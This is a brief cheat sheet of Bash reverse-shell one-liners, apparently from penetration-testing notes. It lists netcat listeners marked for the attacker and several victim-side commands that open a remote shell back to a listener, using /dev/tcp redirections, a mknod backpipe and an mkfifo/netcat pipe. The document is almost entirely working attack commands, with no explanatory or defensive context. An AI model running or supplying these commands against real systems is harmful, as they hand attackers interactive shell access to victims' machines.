# Bash

## Bash Reverse

```text
nc -l -p 8080 -vvv     →  attacker

exec 5<>/dev/tcp/[ip]/8080 → host
cat <&5 | while read line; do $line 2>&5 >&5; done → host
```

## mknod Reverse Shell

```text
nc -nvlp 6666 → attacker

mknod /tmp/backpipe p; /bin/sh 0< /tmp/backpipe | nc 192.168.56.1 6666 1> /tmp/backpipe → victim
```

## bash reverse \( nc -nvlp 8080\)

```text
bash -i >& /dev/tcp/192.168.56.1/8080 0>&1  

or

0<&196;exec 196<>/dev/tcp/10.0.0.1/666; sh <&196 >&196 2>&196

or

bash -c 'bash -i >& /dev/tcp/10.0.0.1/666 0>&1'
```

## ​​for bsd version of netcat without -e option

```text
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 |nc 0.0.0.0 5555 >/tmp/f
```
